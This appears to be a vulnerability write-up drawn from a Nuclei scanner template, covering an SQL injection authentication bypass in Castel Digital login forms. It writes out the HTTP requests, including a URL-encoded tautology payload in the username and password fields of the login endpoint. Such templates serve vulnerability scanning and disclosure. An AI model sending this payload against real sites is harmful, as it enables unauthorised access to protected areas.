# Nuclei Template: Castel Digital - Authentication Bypass
**Template ID:** castel-digital-sqli
**Vulnerability Class:** SQL Injection
**Severity:** High
**CWE:** CWE-89
**Source:** Nuclei Template (`castel-digital-sqli.yaml`)

## Vulnerability Information & PoC

## Description
SQL Injection vulnerability in Castel Digital login forms.

## Steps to reproduce / Exploit Payload
```http
POST /restrito/login/sub/ HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

username=x%27%3D%27x%27or%27x&password=x%27%3D%27x%27or%27x

GET /restrito/ HTTP/1.1
Host: {{Hostname}}
```

## References
- https://www.casteldigital.com.br/
- https://cxsecurity.com/issue/WLB-2024050032
